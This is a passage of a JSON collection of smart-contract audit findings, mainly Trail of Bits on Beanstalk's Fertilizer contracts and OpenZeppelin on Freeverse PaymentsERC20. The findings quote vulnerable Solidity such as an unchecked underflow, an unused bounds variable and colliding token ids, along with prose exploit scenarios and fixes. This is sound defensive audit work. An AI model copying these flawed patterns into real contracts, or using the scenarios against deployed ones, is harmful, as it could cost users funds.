getBpf(season);\n    s.unfertilizedIndex = s.unfertilizedIndex.add(\n        _amount.mul(uint128(bpf))\n    );\n    // Get id\n    id = s.bpf.add(bpf);\n    [...]\n}\n```\n\n### Function: getBpf\n```solidity\nfunction getBpf(uint128 id) internal pure returns (uint128 bpf) {\n    bpf = getHumidity(id).add(1000).mul(PADDING);\n}\n```\n\n### Function: getHumidity\n```solidity\nfunction getHumidity(uint128 id) internal pure returns (uint128 humidity) {\n    if (id == REPLANT_SEASON) return 5000;\n    if (id >= END_DECREASE_SEASON) return 200;\n    uint128 humidityDecrease = id.sub(REPLANT_SEASON + 1).mul(5);\n    humidity = RESTART_HUMIDITY.sub(humidityDecrease);\n}\n```\n*Figure 4.2: The id calculation in LibFertilizer.sol#L32-67*\n\nHowever, the method that generates these token ids does not prevent collisions. The bpf value is always increasing (or does not move), and humidity decreases every season until it reaches 20%. This makes it possible for a user to mint two tokens in two different seasons with different bpf and humidity values and still get the same token id.\n\n### Function: beanstalkMint\n```solidity\nfunction beanstalkMint(address account, uint256 id, uint128 amount, uint128 bpf)\n    external onlyOwner {\n    _balances[id][account].lastBpf = bpf;\n    _safeMint(\n        account,\n        id,\n        amount,\n        bytes('0')\n    );\n}\n```\n*Figure 4.3: The beanstalkMint() function in Fertilizer.sol#L40-48*\n\nAn id collision is not necessarily a problem; however, when a token is minted, the value of the lastBpf field is set to the bpf of the current season, as shown in figure 4.3. This field is very important because it is used to determine the penalty, if any, that a user will incur when redeeming Fertilizer.\n\nTo redeem Fertilizer, users call the `claimFertilizer()` function, which in turn calls the `beanstalkUpdate()` function on the Fertilizer contract.\n\n### Function: claimFertilized\n```solidity\nfunction claimFertilized(uint256[] calldata ids, LibTransfer.To mode)\n    external\n    payable {\n}\nuint256 amount = C.fertilizer().beanstalkUpdate(msg.sender, ids, s.bpf);\nLibTransfer.sendToken(C.bean(), amount, msg.sender, mode);\n```\n*Figure 4.4: The claimFertilizer() function in FertilizerFacet.sol#L27-33*\n\n### Function: beanstalkUpdate\n```solidity\nfunction beanstalkUpdate(\n    address account,\n    uint256[] memory ids,\n    uint128 bpf\n) external onlyOwner returns (uint256) {\n    return __update(account, ids, uint256(bpf));\n}\n```\n\n### Function: __update\n```solidity\nfunction __update(\n    address account,\n    uint256[] memory ids,\n    uint256 bpf\n) internal returns (uint256 beans) {\n    for (uint256 i = 0; i < ids.length; i++) {\n        uint256 stopBpf = bpf < ids[i] ? bpf : ids[i];\n        uint256 deltaBpf = stopBpf - _balances[ids[i]][account].lastBpf;\n        if (deltaBpf > 0) {\n            beans = beans.add(deltaBpf.mul(_balances[ids[i]][account].amount));\n            _balances[ids[i]][account].lastBpf = uint128(stopBpf);\n        }\n    }\n    emit ClaimFertilizer(ids, beans);\n}\n```\n*Figure 4.5: The update flow in Fertilizer.sol#L32-38 and L72-86*\n\nThe `beanstalkUpdate()` function then calls the `__update()` function. This function first calculates the stopBpf value, which is one of two possible values. If the Fertilizer is being redeemed early, stopBpf is the bpf at which the Fertilizer is being redeemed; if the token is being redeemed at “maturity” or later, stopBpf is the token id (i.e., the endBpf value).\n\nAfterward, `__update()` calculates the deltaBpf value, which is used to determine the penalty, if any, that the user will incur when redeeming the token; deltaBpf is calculated using the stopBpf value that was already defined and the lastBpf value, which is the bpf corresponding to the last time the token was redeemed or, if it was never redeemed, the bpf at the moment the token was minted. Finally, the token’s lastBpf field is updated to the stopBpf.\n\nBecause of the id collision, users could accidentally mint Fertilizer tokens with the same id in two different seasons and override their first mint’s lastBpf field, ultimately reducing the amount of yield they are entitled to.\n\n## Exploit Scenario\nImagine the following scenario:\n- It is currently the first season; the bpf is 0 and the humidity is 40%. Alice mints 100 Fertilizer tokens with an id of 41 (the sum of 1 and the bpf (0) and humidity (40) values), and lastBpf is set to 0.\n- Some time goes by, and it is now the third season; the bpf is 35 and the humidity is 5%. Alice mints one additional Fertilizer token with an id of 41 (the sum of 1 and the bpf (35) and humidity (5) values), and lastBpf is set to 35.\n\nBecause of the second mint, the lastBpf field of Alice’s Fertilizer tokens is overridden, making her lose a substantial amount of the yield she was entitled to.\n\nUsing the formula for calculating the number of BEAN tokens that users are entitled to, shown in figure 4.5, Alice’s original yield at “maturity” would have been 4,100 tokens:\n- deltaBpf = id - lastBpf = 41 - 0 = 41\n- balance = 100\n- beans received = deltaBpf * balance = 41 * 100 = 4100\n\nAs a result of the overridden lastBpf field, Alice’s yield instead ends up being only 606 tokens:\n- deltaBpf = id - lastBpf = 41 - 35 = 6\n- balance = 101\n- beans received = deltaBpf * balance = 6 * 101 = 606\n\n## Recommendations\nShort term, separate the role of the id into two separate variables for the token index and endBpf. That way, the index can be optimized to prevent collisions, while endBpf can accurately represent the data it needs to represent.\n\nAlternatively, modify the relevant code so that when an id collision occurs, it either reverts or redeems the previous Fertilizer first before minting the new tokens. \n\nHowever, these alternate remedies could introduce new edge cases or could result in a degraded user experience; if either alternate remedy is implemented, it would need to be thoroughly documented to inform the users of its particular behavior.\n\nLong term, thoroughly document the expected behavior of the associated code and include regression tests to prevent similar issues from being introduced in the future.\n\nAdditionally, exercise caution when using one variable to serve two purposes. Gas savings should be measured and weighed against the increased complexity. Developers should be aware that performing optimizations could introduce new edge cases and increase the code’s complexity.",
      "summary": "\nThis bug report is about a data validation issue in the protocol/contracts/fertilizer/Fertilizer.sol contract. The issue is that if a user mints Fertilizer tokens twice during two different seasons, the same token id for both tokens could be calculated, and the first entry will be overridden; if this occurs and the bpf value changes, the user would be entitled to less yield than expected.\n\nThe id is calculated by the addFertilizer() function in the LibFertilizer library as the sum of 1 and the bpf and humidity values. The method that generates the token ids does not prevent collisions. The bpf value is always increasing (or does not move), and humidity decreases every season until it reaches 20%. This makes it possible for a user to mint two tokens in two different seasons with different bpf and humidity values and still get the same token id.\n\nWhen a token is minted, the value of the lastBpf field is set to the bpf of the current season. This field is very important because it is used to determine the penalty, if any, that a user will incur when redeeming Fertilizer.\n\nTo redeem Fertilizer, users call the claimFertilizer() function, which in turn calls the beanstalkUpdate() function on the Fertilizer contract. The beanstalkUpdate() function then calls the __update() function. This function first calculates the stopBpf value, which is one of two possible values. If the Fertilizer is being redeemed early, stopBpf is the bpf at which the Fertilizer is being redeemed; if the token is being redeemed at “maturity” or later, stopBpf is the token id (i.e., the endBpf value). Afterward, __update() calculates the deltaBpf value, which is used to determine the penalty, if any, that the user will incur when redeeming the token; deltaBpf is calculated using the stopBpf value that was already defined and the lastBpf value, which is the bpf corresponding to the last time the token was redeemed or, if it was never redeemed, the bpf at the moment the token was minted. Finally, the token’",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21261",
      "title": "Possible underﬂow could allow more Fertilizer than MAX_RAISE to be minted",
      "impact": "MEDIUM",
      "content": "## Beanstalk Security Assessment\n\n## Difficulty: Low\n\n## Type: Data Validation\n\n## Target: protocol/contracts/fertilizer/FertilizerPremint.sol\n\n### Description\nThe `remaining()` function could underflow, which could allow the Barn Raise to continue indefinitely.\n\nFertilizer is an ERC1155 token issued for participation in the Barn Raise, a community fundraiser intended to recapitalize the Beanstalk protocol with Bean and liquidity provider (LP) tokens that were stolen during the April 2022 governance hack. Fertilizer entitles holders to a pro rata portion of one-third of minted Bean tokens if the Fertilizer token is active, and it can be minted as long as the recapitalization target ($77 million) has not been reached.\n\nUsers who want to buy Fertilizer call the `mint()` function and provide one USDC for each Fertilizer token they want to mint.\n\n```solidity\nfunction mint(uint256 amount) external payable nonReentrant {\n    uint256 r = remaining();\n    if (amount > r) amount = r;\n    __mint(amount);\n    IUSDC.transferFrom(msg.sender, CUSTODIAN, amount);\n}\n```\n*Figure 3.1: The `mint()` function in FertilizerPremint.sol#L51-56*\n\nThe `mint()` function first checks how many Fertilizer tokens remain to be minted by calling the `remaining()` function (figure 3.2); if the user is trying to mint more Fertilizer than available, the `mint()` function mints all of the Fertilizer tokens that remain.\n\n```solidity\nfunction remaining() public view returns (uint256) {\n    return MAX_RAISE - IUSDC.balanceOf(CUSTODIAN);\n}\n```\n*Figure 3.2: The `remaining()` function in FertilizerPremint.sol#L84-87*\n\nHowever, the FertilizerPremint contract does not use Solidity 0.8, so it does not have native overflow and underflow protection. As a result, if the amount of Fertilizer purchased reaches MAX_RAISE (i.e., 77 million), an attacker could simply send one USDC to the CUSTODIAN wallet to cause the `remaining()` function to underflow, allowing the sale to continue indefinitely.\n\nIn this particular case, Beanstalk protocol funds are not at risk because all the USDC used to purchase Fertilizer tokens is sent to a Beanstalk community-owned multisignature wallet; however, users who buy Fertilizer after such an exploit would lose the gas funds they spent, and the project would incur further reputational damage.\n\n### Exploit Scenario\nThe Barn Raise is a total success: the MAX_RAISE amount is hit, meaning that 77 million Fertilizer tokens have been minted. Alice, a malicious user, notices the underflow risk in the `remaining()` function; she sends one USDC to the CUSTODIAN wallet, triggering the underflow and causing the function to return the `maxuint256` instead of MAX_RAISE. As a result, the sale continues even though the MAX_RAISE amount was reached.\n\nOther users, not knowing that the Barn Raise should be complete, continue to successfully mint Fertilizer tokens until the bug is discovered and the system is paused to address the issue. While no Beanstalk funds are lost as a result of this exploit, the users who continued minting Fertilizer after the MAX_RAISE was reached lose all the gas funds they spent.\n\n### Recommendations\nShort term, add a check in the `remaining()` function so that it returns `0` if `USDC.balanceOf(CUSTODIAN)` is greater than or equal to `MAX_RAISE`. This will prevent the underflow from being triggered. Because the function depends on the CUSTODIAN’s balance, it is still possible for someone to send USDC directly to the CUSTODIAN wallet and reduce the amount of “available” Fertilizer; however, attackers would lose their money in the process, meaning that there are no incentives to perform this kind of action.\n\nLong term, thoroughly document the expected behavior of the FertilizerPremint contract and the properties (invariants) it should enforce, such as “no tokens can be minted once the MAX_RAISE is reached.” Expand the unit test suite to test that these properties hold.",
      "summary": "\nThis bug report is about the FertilizerPremint contract, which is used for the Barn Raise community fundraiser for the Beanstalk protocol. The Barn Raise is intended to recapitalize the Beanstalk protocol with Bean and liquidity provider (LP) tokens that were stolen in April 2022. The Fertilizer token can be minted as long as the recapitalization target ($77 million) has not been reached. \n\nThe bug is that the remaining() function could underflow, which could allow the Barn Raise to continue indefinitely. This is because the FertilizerPremint contract does not use Solidity 0.8, which has native overflow and underflow protection. If the amount of Fertilizer purchased reaches MAX_RAISE (i.e., 77 million), an attacker could simply send one USDC to the CUSTODIAN wallet to cause the remaining() function to underflow, allowing the sale to continue indefinitely. \n\nWhile Beanstalk protocol funds are not at risk because all the USDC used to purchase Fertilizer tokens is sent to a Beanstalk community-owned multisignature wallet, users who buy Fertilizer after such an exploit would lose the gas funds they spent, and the project would incur further reputational damage. \n\nThe recommendation is to add a check in the remaining() function so that it returns 0 if USDC.balanceOf(CUSTODIAN) is greater than or equal to MAX_RAISE. This will prevent the underflow from being triggered. Furthermore, the project should thoroughly document the expected behavior of the FertilizerPremint contract and expand the unit test suite to test that these properties hold.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21260",
      "title": "Lack of a two-step process for ownership transfer",
      "impact": "HIGH",
      "content": "## Beanstalk Security Assessment\n\n**Difficulty:** Low  \n**Type:** Data Validation  \n**Target:** `protocol/contracts/farm/facets/OwnershipFacet.sol`  \n\n## Description\nThe `transferOwnership()` function is used to change the owner of the Beanstalk protocol. This function calls the `setContractOwner()` function, which immediately sets the contract’s new owner. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes.\n\n```solidity\nfunction transferOwnership(address _newOwner) external override {\n    LibDiamond.enforceIsContractOwner();\n    LibDiamond.setContractOwner(_newOwner);\n}\n```\n*Figure 2.1: The `transferOwnership()` function in `OwnershipFacet.sol#L13-16`*\n\n## Exploit Scenario\nThe owner of the Beanstalk contracts is a community-controlled multisignature wallet. The community agrees to upgrade to an on-chain voting system, but the wrong address is mistakenly provided to its call to `transferOwnership()`, permanently misconfiguring the system.\n\n## Recommendations\n1. **Short term:** Implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer.\n2. **Long term:** Identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.\n\n*Trail of Bits*  \n*Beanstalk Security Assessment*  \n*PUBLIC*",
      "summary": "\nThis bug report is about a data validation issue in the Beanstalk protocol's OwnershipFacet.sol file. The transferOwnership() function is used to change the owner of the Beanstalk protocol, and it calls the setContractOwner() function which immediately sets the contract’s new owner. This could lead to mistakes that are irreversible. \n\nAn example of an exploit scenario is if the wrong address is mistakenly provided to the transferOwnership() call, it will permanently misconﬁgure the system. \n\nTo fix this issue, a two-step process should be implemented to transfer contract ownership. The owner should propose a new address, and then the new address should execute a call to accept the role, completing the transfer. Additionally, all possible actions that can be taken by privileged accounts and their associated risks should be identified and documented. This will facilitate reviews of the codebase and prevent future mistakes.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21259",
      "title": "Attackers could mint more Fertilizer than intended due to an unused variable",
      "impact": "MEDIUM",
      "content": "## Beanstalk Security Assessment\n\n## Diﬃculty: High\n\n## Type: Data Validation\n\n### Target: \n`protocol/contracts/farm/facets/FertilizerFacet.sol`\n\n### Description\nDue to an unused local variable, an attacker could mint more Fertilizer than should be allowed by the sale.\n\nThe `mintFertilizer()` function checks that the `_amount` variable is no greater than the `remaining` variable; this ensures that more Fertilizer than intended cannot be minted; however, the `_amount` variable is not used in subsequent function calls—instead, the `amount` variable is used; the code effectively skips this check, allowing users to mint more Fertilizer than required to recapitalize the protocol.\n\n```solidity\nfunction mintFertilizer (\n    uint128 amount,\n    uint256 minLP,\n    LibTransfer.From mode\n) external payable {\n    uint256 remaining = LibFertilizer.remainingRecapitalization();\n    uint256 _amount = uint256(amount);\n    if (_amount > remaining) _amount = remaining;\n    \n    LibTransfer.receiveToken(\n        C.usdc(),\n        uint256(amount).mul(1e6),\n        msg.sender,\n        mode\n    );\n    \n    uint128 id = LibFertilizer.addFertilizer(\n        uint128(s.season.current),\n        amount,\n        minLP\n    );\n\n    C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf);\n}\n```\n*Figure 1.1: The `mintFertilizer()` function in `FertilizerFacet.sol` (lines 35-56)*\n\nNote that this flaw can be exploited only once: if users mint more Fertilizer than intended, the `remainingRecapitalization()` function returns 0 because the `dollarPerUnripeLP()` and `unripeLP().totalSupply()` variables are constants.\n\n```solidity\nfunction remainingRecapitalization() internal view returns (uint256 remaining) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    uint256 totalDollars = C.dollarPerUnripeLP()\n        .mul(C.unripeLP().totalSupply())\n        .div(DECIMALS);\n        \n    if (s.recapitalized >= totalDollars) return 0;\n    return totalDollars.sub(s.recapitalized);\n}\n```\n*Figure 1.2: The `remainingRecapitalization()` function in `LibFertilizer.sol` (lines 132-145)*\n\n### Exploit Scenario\nRecapitalization of the Beanstalk protocol is almost complete; only 100 units of Fertilizer for sale remain. Eve, a malicious user, calls `mintFertilizer()` with an amount of 10 million, significantly over-funding the system. Because the Fertilizer supply increased significantly above the theoretical maximum, other users are entitled to a much smaller yield than expected.\n\n### Recommendations\n- **Short term:** Use `_amount` instead of `amount` as the parameter in the functions that are called after `mintFertilizer()`.\n- **Long term:** Thoroughly document the expected behavior of the `FertilizerFacet` contract and the properties (invariants) it should enforce, such as “token amounts above the maximum recapitalization threshold cannot be sold.” Expand the unit test suite to test that these properties hold.",
      "summary": "\nThis bug report is about a high difficulty data validation issue in the FertilizerFacet.sol contract. The code contains an unused local variable which allows an attacker to mint more Fertilizer than should be allowed by the sale. In the mintFertilizer() function, the _amount variable is checked to make sure it is no greater than the remaining variable, however, the _amount variable is not used in subsequent function calls and is instead replaced with the amount variable. This effectively skips the check, allowing users to mint more Fertilizer than required to recapitalize the protocol.\n\nThe exploit scenario is that a malicious user calls the mintFertilizer() function with an amount of 10 million, significantly over-funding the system. This results in other users getting a much smaller yield than expected.\n\nTo fix this issue, the _amount variable should be used instead of the amount variable in the functions called after mintFertilizer(). Also, the expected behavior of the FertilizerFacet contract should be thoroughly documented and the unit test suite should be expanded to test that the properties hold.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "10578",
      "title": "Registration process is not clearly documented",
      "impact": "LOW",
      "content": "The `PaymentsERC20` contract allows a seller to register themselves by calling the [`registerAsSeller`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L83) function. However, the system allows purchase of assets from unregistered sellers if the [`_isSellerRegistrationRequired`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L47) flag is not set. In the scenario where `_isSellerRegistrationRequired` is set to false, any calls to `registerAsSeller` would be meaningless and would result in seller paying for the gas used for making this unnecessary transaction.\n\n\nThe codebase fails to document the meaning of “registration”, the advantage of being a registered seller, and why is it okay to disable this process.\n\n\nConsider adding proper documentation as to why this process is required in the system and the scenarios in which it can be changed or disabled.\n\n\n***Update:** Fixed as of [commit `65269d9` of PR #8](https://github.com/freeverseio/PaymentsERC20Public/pull/8/commits/65269d92bf4dc5873494a8698489ab6c1f656365). However, there is a typographical error in the newly added docstring. In the [`README`](https://github.com/freeverseio/PaymentsERC20Public/pull/8/files#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R48) and [docstring in the `PaymentsERC20` contract](https://github.com/freeverseio/PaymentsERC20Public/pull/8/files#diff-a1161af37df27afe160babd013386cbb0e5513e2201e7a5be2f607cb8095dc4aR44), “executed” is misspelled as “exectuted”.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10577",
      "title": "Naming issues hinder code understanding and readability",
      "impact": "LOW",
      "content": "To favor explicitness and readability, several parts of the contracts may benefit from better naming. Some suggestions are:\n\n\n* `States` enum in the `IPaymentsERC20` interface should be `State` enum\n* In the `EIP712Verifier`, the variable name `inp` is confusing as it indicates both [`PaymentInput`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/EIP712Verifier.sol#L32) and [`AssetTransferResult`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/EIP712Verifier.sol#L55) structs. Consider having different names for different parameters.\n* Throughout the `PaymentsERC20` contract, the local variable name for `Payment` struct is [`p`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L226).\n\n\nConsider having a meaningful naming convention for variables instead of using single letters such as `p` or abbreviated words such as `inp`.\n\n\n***Update:** Fixed as of [commit `4c2dc66` of PR #7](https://github.com/freeverseio/PaymentsERC20Public/pull/7/commits/4c2dc664e963538804a11f64ed2340242e026c51).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10576",
      "title": "No check that seller is already registered",
      "impact": "LOW",
      "content": "The `registerAsSeller` function in the `PaymentsERC20` contract [emits a `NewSeller` event](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L85) when a user calls it. There is no check in `registerAsSeller` to determine if a user address is already registered, so this function will emit a `NewSeller` event every time it is called. Depending on how the event log is used, this may lead to incorrect behavior by external observers of the contract if a user calls the function more than once.\n\n\nConsider checking the existing bool value of [`_isRegisteredSeller`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L48) when `registerAsSeller` is called, and reverting if the user is already registered.\n\n\n***Update:** Fixed as of [commit `6c7a698` of PR #6](https://github.com/freeverseio/PaymentsERC20Public/pull/6/commits/6c7a6981271213c96106592df04c560e5120285e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10575",
      "title": "Missing docstrings",
      "impact": "LOW",
      "content": "The following functions in the codebase lack documentation:\n\n\n* All the functions, events, and state variables in the [`FeesCollectors`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/FeesCollectors.sol) contract are missing docstrings\n* All the functions, events, and state variables in the [`Operators`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/Operators.sol) contract are missing docstrings\n* The [`PaymentInput`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IEIP712Verifier.sol#L15) and [`AssetTransferResult`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IEIP712Verifier.sol#L25) structs in the `IEIP712Verifier` interface have no comments explaining any of the fields\n* [None of the events](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L44-L53) in the `IPaymentsERC20` interface have any documentation\n* There are no docstrings in the [`MyToken`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/ERC20/ERC20Token.sol) contract to explain the contract’s purpose\n\n\nThis lack of documentation hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned, and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n***Update:** Fixed as of [commit `d311775` of PR #5](https://github.com/freeverseio/PaymentsERC20Public/pull/5/commits/d311775947bd0d0f124608d2b3661864cab2831e). However, there are a few typographical errors in the newly added docstrings:* – *In the [docstring above the `MyToken` contract](https://github.com/freeverseio/PaymentsERC20Public/pull/5/commits/d311775947bd0d0f124608d2b3661864cab2831e#diff-beef814db30f6b0739866b0fcf066cfd6bb25c0d13c505670ccf50c6bc35855aR7), “implementation” is misspelled as “implentation”* – *In the [docstring above the `AssetTransferResult` struct](https://github.com/freeverseio/PaymentsERC20Public/pull/5/commits/d311775947bd0d0f124608d2b3661864cab2831e#diff-406c64718cc3e18344e4d19841ba68227a8e546c7441253c5c38da85a5a0abdfR53), “ASSET\\_TRANSFERRING” is misspelled as “ASSET\\_TRANSFERING”; [PR #26](https://github.com/freeverseio/PaymentsERC20Public/pull/26/files#diff-b78f92f68b12efa431798fc6ddb920d8eef31586fa2cf2fb9df76ca467dee40bR51) moves this line to `ISignableStructs.sol`*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10574",
      "title": "Inconsistent and lack of indexed event parameters",
      "impact": "LOW",
      "content": "In the `IPaymentsERC20` contract, the [`Paid`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L52) event has an unindexed `paymentId` parameter, even though `paymentId` is indexed in the [`BuyerRefunded`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L46) and [`Payin`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L47) events.\n\n\nIn `FeesCollectors.sol`, the [`DefaultFeesCollector`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/FeesCollectors.sol#L21) and [`UniversalFeesCollector`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/FeesCollectors.sol#L22) events do not apply the `indexed` keyword to the `feesCollector` or `universeId` parameters.\n\n\nIn `Operators.sol`, the [`DefaultOperator`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/Operators.sol#L22) and [`UniverseOperator`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/Operators.sol#L23) events do not apply the `indexed` keyword to the `operator` or `universeId` parameters.\n\n\nIndexed parameters are useful for quick offchain indexing of logs. Consider [indexing applicable event parameters](https://solidity.readthedocs.io/en/latest/contracts.html#events) to support the searching and filtering abilities of offchain services.\n\n\n***Update:** Fixed as of [commit `745c035` of PR #4](https://github.com/freeverseio/PaymentsERC20Public/pull/4/commits/745c035d42ba1343793e7d0b2c0759cce38fb3c6).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10573",
      "title": "Duplicate code",
      "impact": "LOW",
      "content": "Duplication of code is error prone because the repeated implementations can get out of sync as the codebase evolves, potentially leading to unexpected behavior. There two instances of code duplication in the `PaymentsERC20` contract:\n\n\n* The majority of the code in the `pay` and `relayedPay` functions in `PaymentsERC20` is duplicated. Once the initial checks are completed in each case, all of the remaining steps are identical. [Lines 102-123](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L102-L123) in `relayedPay` are nearly identical to [lines 141-162](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L141-L162) in `pay`, with the only difference being [line 106](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L106) vs [line 145](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L145), which are functionally equivalent in setting the operator. Consider creating a shared private function for this duplicate code.\n* The `maxFundsAvailable` function makes calls to the [external ERC20 contract](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L53) in order to obtain the buyer’s approved spend allowance for the `PaymentERC20` contract and the buyer’s token balance in their wallet. To obtain allowance and balance information from the external contract, `PaymentERC20` implements [`allowance`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L318) and [`erc20BalanceOf`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L313) view functions that make respective calls to the `allowance` and `balanceOf` functions of the `IERC20` interface. However, when `maxFundsAvailable` performs the allowance and balance queries, it [calls the provided `allowance` function](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L364), but not the provided `balanceOf` function. In the latter case, `IERC20.balanceOf()` is [called directly](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L365), duplicating the code in the `erc20BalanceOf` function. Consider using the `erc20BalanceOf` function to obtain the external token balance `erc20Balance`.\n\n\n***Update:** Fixed as of [commit `645f3f4` of PR 